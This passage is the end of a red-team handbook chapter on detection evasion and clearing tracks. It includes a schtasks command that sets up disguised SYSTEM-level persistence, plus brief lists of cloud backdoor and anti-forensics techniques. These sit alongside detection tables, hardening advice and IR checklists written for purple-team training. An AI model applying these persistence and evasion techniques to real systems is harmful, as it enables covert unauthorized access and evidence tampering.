+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="cmd" data-theme="github-light github-dark"><code data-language="cmd" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">schtasks /create /tn </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;\Microsoft\Windows\DesktopMgmt\ConfigSync&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> /tr </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;C:\ProgramData\msync\update.exe&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> /sc hourly /ru SYSTEM</span></span></code></pre></figure>
+<p>Abuse of *<em>Microsoft*</em> namespace style names — still visible to inventory tools.</p>
+<h3 id="115-dll-sideload-persistence">11.5 DLL Sideload Persistence<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#115-dll-sideload-persistence" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Plant malicious DLL next to signed auto-start app — may blend with app updates.</p>
+<h3 id="116-cloud-persistence-related-to-file-06">11.6 Cloud Persistence (Related to File 06)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#116-cloud-persistence-related-to-file-06" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Backdoor IAM users/keys</li>
+<li>Malicious Lambda triggers</li>
+<li>GitHub Actions workflow on schedule</li>
+<li>Modified container images in registry</li>
+</ul>
+<p>Often <strong>more durable</strong> than host malware and missed by host EDR.</p>
+<hr/>
+<h2 id="12-forensic-awareness--anti-forensics">12. Forensic Awareness &amp; Anti-Forensics<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-forensic-awareness--anti-forensics" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="121-what-ir-will-look-at">12.1 What IR Will Look At<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#121-what-ir-will-look-at" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Source</th><th>Survives local wipe?</th></tr></thead><tbody><tr><td>EDR cloud timeline</td><td>Yes</td></tr><tr><td>SIEM forwarded logs</td><td>Yes</td></tr><tr><td>NetFlow / proxy</td><td>Yes</td></tr><tr><td>Cloud audit (CloudTrail)</td><td>Yes</td></tr><tr><td>Local EVTX only</td><td>No if wiped pre-forward</td></tr><tr><td>Memory image</td><td>If captured live</td></tr><tr><td>Backups / snapshots</td><td>Often yes</td></tr></tbody></table></div>
+<p><strong>Key lesson:</strong> Local anti-forensics fails against <strong>centralized telemetry</strong>. True OPSEC is reducing malicious <em>signal</em>, not scrubbing one host.</p>
+<h3 id="122-anti-forensics-categories">12.2 Anti-Forensics Categories<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#122-anti-forensics-categories" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li><strong>Data hiding</strong> — ADS, stego, slack space (limited modern value)</li>
+<li><strong>Artifact destruction</strong> — log clear, file delete</li>
+<li><strong>Trail fabrication</strong> — false logs (rare, complex)</li>
+<li><strong>Encryption</strong> — ransomware-style (out of scope / illegal without auth)</li>
+<li><strong>Time manipulation</strong> — timestomp, clock skew</li>
+</ol>
+<h3 id="123-memory-vs-disk">12.3 Memory vs Disk<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#123-memory-vs-disk" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Memory-only payloads reduce disk forensics but:</p>
+<ul>
+<li>Still generate network detections</li>
+<li>Still generate EDR behavioral events</li>
+<li>Crash dumps / hibernation may capture memory</li>
+</ul>
+<h3 id="124-report-friendly-language">12.4 Report-Friendly Language<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#124-report-friendly-language" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>When documenting evasion tests for clients:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="text" data-theme="github-light github-dark"><code data-language="text" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>Emulated adversary technique T1070.001 (Clear Windows Event Logs) on HOST01</span></span>
+<span data-line><span>with explicit ROE approval. Security log clear generated Event ID 1102,</span></span>
+<span data-line><span>which SOC detected in 4 minutes. Recommendation: alert on 1102 + correlate</span></span>
+<span data-line><span>with privileged logons.</span></span></code></pre></figure>
+<p>Turn red actions into <strong>blue detection quality metrics</strong>.</p>
+<hr/>
+<h2 id="13-blue-team-detection-opportunities">13. Blue Team Detection Opportunities<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#13-blue-team-detection-opportunities" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="131-high-fidelity-alerts">13.1 High-Fidelity Alerts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#131-high-fidelity-alerts" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Event</th><th>Why</th></tr></thead><tbody><tr><td>Security log cleared (1102)</td><td>Almost always investigate</td></tr><tr><td>Sysmon config changed</td><td>Tamper</td></tr><tr><td>Unexpected service ImagePath change</td><td>Privesc/persist</td></tr><tr><td>LSASS access by non-AV</td><td>Cred dump</td></tr><tr><td>New local admin</td><td>Persistence</td></tr><tr><td><code>certutil</code> + URL</td><td>LOLBin download</td></tr><tr><td>Encoded PowerShell from Office</td><td>Phish chain</td></tr><tr><td>Privileged container start</td><td>K8s escape prep</td></tr><tr><td>CloudTrail <code>CreateAccessKey</code> on admin</td><td>Cloud persist</td></tr><tr><td>Disable Defender / uninstall EDR</td><td>Tamper</td></tr></tbody></table></div>
+<h3 id="132-hardening-that-beats-cleverness">13.2 Hardening That Beats Cleverness<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#132-hardening-that-beats-cleverness" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Central log immutability (WORM / separate SIEM account)</li>
+<li>EDR with tamper protection</li>
+<li>Application allow-listing (WDAC)</li>
+<li>Least privilege + no standing local admin</li>
+<li>Script block logging + Command line auditing</li>
+<li>Cloud: SCPs, PIM/JIT, short-lived credentials</li>
+<li>Immutable CI runners + signed artifacts</li>
+</ul>
+<h3 id="133-purple-team-loop">13.3 Purple Team Loop<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#133-purple-team-loop" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li>Red uses technique from this handbook</li>
+<li>Blue measures detect/prevent time</li>
+<li>Tune analytics</li>
+<li>Retest</li>
+</ol>
+<p>This file’s highest professional value is <strong>closing that loop</strong>, not “winning” invisibility permanently.</p>
+<hr/>
+<h2 id="14-references">14. References<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#14-references" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li><a href="https://attack.mitre.org/tactics/TA0005/" class="external external-link">MITRE ATT&amp;CK — Defense Evasion<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1070/" class="external external-link">MITRE ATT&amp;CK T1070<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> Indicator Removal</li>
+<li><a href="https://attack.mitre.org/techniques/T1055/" class="external external-link">MITRE ATT&amp;CK T1055<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> Process Injection</li>
+<li><a href="https://attack.mitre.org/techniques/T1218/" class="external external-link">MITRE ATT&amp;CK T1218<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> System Binary Proxy Execution</li>
+<li><a href="https://lolbas-project.github.io/" class="external external-link">LOLBAS<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" class="external external-link">Microsoft Sysmon<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing" class="external external-link">Microsoft — Command line process auditing<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://github.com/SigmaHQ/sigma" class="external external-link">Sigma rules<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> — open detection rules</li>
+<li><a href="https://github.com/redcanaryco/atomic-red-team" class="external external-link">Atomic Red Team<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> — test mappings</li>
+<li><a href="https://documentation.wazuh.com/" class="external external-link">OSSEC/Wazuh log analysis docs<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final" class="external external-link">NIST SP 800-61<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> Incident handling</li>
+</ul>
+<hr/>
+<h2 id="appendix-a-opsec-checklist-red">Appendix A: OPSEC Checklist (Red)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-a-opsec-checklist-red" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul class="contains-task-list">
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> ROE reviewed for evasion/log tampering</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Prefer LOLBins / admin protocols over custom malware when sufficient</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Avoid public AMSI/UAC one-liners on mature EDR</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Minimize disk writes; clean staging dirs</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Do not mass-clear logs unless testing IR</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Inventory all persistence</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Document for cleanup and purple team notes</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Assume SIEM already has copies</li>
+</ul>
+<h2 id="appendix-b-ir-checklist-blue">Appendix B: IR Checklist (Blue)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-b-ir-checklist-blue" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul class="contains-task-list">
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Alert on log clear / EDR tamper</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Forward logs off-box immutably</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Baseline LOLBin usage</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Hunt persistence (tasks, WMI, services, systemd)</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Compare disk wipe claims against proxy/EDR/cloud</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Preserve memory if live response allows</li>
+<li class="task-list-item" data-task=" "><input type="checkbox" class="checkbox-toggle"/> Rotate credentials after suspected token theft</li>
+</ul>
+<h2 id="appendix-c-quiet-vs-loud-actions">Appendix C: “Quiet” vs “Loud” Actions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-c-quiet-vs-loud-actions" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Quieter</th><th>Louder</th></tr></thead><tbody><tr><td>Existing SSH/WinRM</td><td>New reverse shell exe</td></tr><tr><td>Cloud API with stolen role</td><td>Kernel exploit</td></tr><tr><td>Read access abuse</td><td>Disable AV</td></tr><tr><td>Selective staging in memory</td><td>LinPEAS full + tooling drop</td></tr><tr><td>Normal business ports</td><td>DNS tunnel megabytes</td></tr></tbody></table></div>
+<h2 id="appendix-d-legal-reminder">Appendix D: Legal Reminder<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-d-legal-reminder" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Unauthorized access, sabotage of logs on systems you do not own, or interference with evidence in real investigations can be <strong>criminal</strong>. This handbook is for <strong>lawful</strong> security testing, education, and defense.</p>
+<hr/>
+<p><em>End of File 08 — Detection, Evasion, and Clearing Tracks</em><br/>
+<em>End of Privilege Escalation Handbook (Files 01–08)</em></p>
+<hr/>
+<h2 id="handbook-index">Handbook Index<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#handbook-index" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>File</th><th>Topic</th></tr></thead><tbody><tr><td>01</td><td>Linux Enumeration Deep Dive</td></tr><tr><td>02</td><td>Linux Privilege Escalation Techniques</td></tr><tr><td>03</td><td>Windows Privilege Escalation Concepts</td></tr><tr><td>04</td><td>Windows Privilege Escalation Techniques</td></tr><tr><td>05</td><td>Reverse Shells, Stabilisation, and Tools</td></tr><tr><td>06</td><td>Modern Cloud and Container Privilege Escalation</td></tr><tr><td>07</td><td>Automated Tools and Resources</td></tr><tr><td>08</td><td>Detection, Evasion, and Clearing Tracks</td></tr></tbody></table></div>
+<p><strong>Use responsibly. Get authorization. Help defenders improve.</strong></p></div></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false,&quot;enable&quot;:true}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:false,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true,&quot;enable&quot;:true}"></div></div></div><div class="toc"><button type="button" class="toc-header" aria-controls="toc-290" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-0" class="toc-content overflow"><li class="depth-0"><a href="#detection-evasion-and-clearing-tracks" data-for="detection-evasion-and-clearing-tracks">Detection, Evasion, and Clearing Tracks</a></li><li class="depth-1"><a href="#table-of-contents" data-for="table-of-contents">Table of Contents</a></li><li class="depth-1"><a href="#1-engagement-ethics--roe" data-for="1-engagement-ethics--roe">1. Engagement Ethics &amp; ROE</a></li><li class="depth-2"><a href="#11-before-you-hide-anything" data-for="11-before-you-hide-anything">1.1 Before You Hide Anything</a></li><li class="depth-2"><a href="#12-professional-defaults" data-for="12-professional-defaults">1.2 Professional Defaults</a></li><li class="depth-1"><a href="#2-detection-landscape-overview" data-for="2-detection-landscape-overview">2. Detection Landscape Overview</a></li><li class="depth-2"><a href="#21-layers" data-for="21-layers">2.1 Layers</a></li><li class="depth-2"><a href="#22-what-modern-edr-cares-about" data-for="22-what-modern-edr-cares-about">2.2 What Modern EDR Cares About</a></li><li class="depth-2"><a href="#23-red-team-implication" data-for="23-red-team-implication">2.3 Red Team Implication</a></li><li class="depth-1"><a href="#3-living-off-the-land-lolbins" data-for="3-living-off-the-land-lolbins">3. Living Off the Land (LOLBins)</a></li><li class="depth-2"><a href="#31-concept" data-for="31-concept">3.1 Concept</a></li><li class="depth-2"><a href="#32-windows-examples-defensive--offensive-awareness" data-for="32-windows-examples-defensive--offensive-awareness">3.2 Windows Examples (Defensive + Offensive Awareness)</a></li><li class="depth-2"><a href="#33-linux-examples" data-for="33-linux-examples">3.3 Linux Examples</a></li><li class="depth-2"><a href="#34-why-it-helps-attackers" data-for="34-why-it-helps-attackers">3.4 Why It Helps Attackers</a></li><li class="depth-2"><a href="#35-why-defenders-still-catch-it" data-for="35-why-defenders-still-catch-it">3.5 Why Defenders Still Catch It</a></li><li class="depth-1"><a href="#4-process-injection-concepts" data-for="4-process-injection-concepts">4. Process Injection Concepts</a></li><li class="depth-2"><a href="#41-why-inject" data-for="41-why-inject">4.1 Why Inject?</a></li><li class="depth-2"><a href="#42-common-classes-conceptual" data-for="42-common-classes-conceptual">4.2 Common Classes (Conceptual)</a></li><li class="depth-2"><a href="#43-practical-notes-for-operators" data-for="43-practical-notes-for-operators">4.3 Practical Notes for Operators</a></li><li class="depth-2"><a href="#44-detection-angles" data-for="44-detection-angles">4.4 Detection Angles</a></li><li class="depth-1"><a href="#5-obfuscation-techniques" data-for="5-obfuscation-techniques">5. Obfuscation Techniques</a></li><li class="depth-2"><a href="#51-powershell-obfuscation" data-for="51-powershell-obfuscation">5.1 PowerShell Obfuscation</a></li><li class="depth-2"><a href="#52-command-line-obfuscation" data-for="52-command-line-obfuscation">5.2 Command-Line Obfuscation</a></li><li class="depth-2"><a href="#53-binary-packing--crypting" data-for="53-binary-packing--crypting">5.3 Binary Packing / Crypting</a></li><li class="depth-2"><a href="#54-script-languages" data-for="54-script-languages">5.4 Script Languages</a></li><li class="depth-2"><a href="#55-amsi--script-logging-awareness" data-for="55-amsi--script-logging-awareness">5.5 AMSI / Script Logging (Awareness)</a></li><li class="depth-1"><a 